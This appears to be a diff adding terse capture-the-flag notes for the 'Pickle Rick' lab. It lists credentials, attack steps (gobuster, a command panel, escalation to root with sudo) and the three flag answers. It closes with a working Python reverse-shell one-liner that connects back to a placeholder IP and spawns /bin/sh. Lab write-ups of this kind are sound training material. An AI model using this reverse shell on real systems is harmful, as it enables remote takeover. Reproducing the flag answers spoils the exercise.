@@ -1,0 +1,27 @@
+target - 10.10.x.x
+
+Username: R1ckRul3s
+password: Wubbalubbadubdub
+
+
+step:
+1.gobuster>login.php>login>cmd panel>Sup3rS3cretPickl3Ingred.txt>first ingredient
+
+2. cmd panel > python reverse by nc>sudo cd /home/rick > second ingredient
+
+3. cmd panel >sudo su> cd /root/3rd.txt
+
+1.What is the first ingredient Rick needs?
+mr. meeseek hair
+
+2.Whats the second ingredient Rick needs?
+1 jerry tear
+
+
+3.Whats the final ingredient Rick needs?
+fleeb juice
+
+
+
+python reverse shell
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
